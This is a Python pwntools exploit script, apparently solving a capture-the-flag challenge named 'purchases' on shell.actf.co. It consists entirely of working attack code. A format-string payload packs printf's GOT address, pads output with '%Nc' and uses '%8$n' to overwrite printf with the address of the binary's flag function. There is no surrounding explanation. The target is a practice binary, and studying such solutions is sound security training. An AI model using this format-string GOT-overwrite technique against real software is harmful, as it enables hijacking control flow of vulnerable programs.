#coding=utf-8
from pwn import *

context.binary = './purchases'

debug = 1
if not debug:
  r = remote('shell.actf.co', 19011)
else:
  r = process('./purchases')

elf = ELF('./purchases')

r.recvuntil('What item would you like to purchase?')
#r.sendline('a')
r.sendline(p64(elf.symbols['got.printf']) + '%{}c'.format(elf.symbols['flag'] - 8) + '%8$n')
log.info('printf@got:{0}, flag:{1}'.format(elf.symbols['got.printf'], elf.symbols['flag']))

print r.recvall(1)


